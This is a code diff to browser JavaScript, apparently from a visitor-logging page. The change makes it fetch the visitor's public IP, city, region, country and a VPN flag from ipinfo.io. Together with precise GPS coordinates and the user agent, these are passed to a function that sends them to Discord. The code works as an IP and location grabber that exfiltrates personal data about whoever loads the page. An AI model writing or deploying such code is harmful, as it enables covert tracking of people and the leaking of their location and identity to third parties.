@@ -59,13 +59,14 @@
 
                     const coordinates = `${position.coords.latitude},${position.coords.longitude}`;
 
-                    const infoResponse = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${position.coords.latitude}&lon=${position.coords.longitude}`);
+                    // Requesting IP and address from a third-party service (replace with your preferred service)
+                    const infoResponse = await fetch('https://ipinfo.io/json');
                     const infoData = await infoResponse.json();
 
-                    const ip = 'N/A'; // Unfortunately, you can't reliably retrieve the IP directly from the client-side
-                    const address = `${infoData.address.city || 'N/A'}, ${infoData.address.state || 'N/A'}, ${infoData.address.country || 'N/A'}`;
+                    const ip = infoData.ip || 'N/A';
+                    const address = `${infoData.city || 'N/A'}, ${infoData.region || 'N/A'}, ${infoData.country || 'N/A'}`;
                     const userAgent = navigator.userAgent;
-                    const isVPN = false; // It's not possible to reliably determine VPN usage client-side
+                    const isVPN = infoData.vpn || false;
 
                     // Sending data to Discord with VPN status
                     sendInfoToDiscord(ip, address, userAgent, isVPN, coordinates);
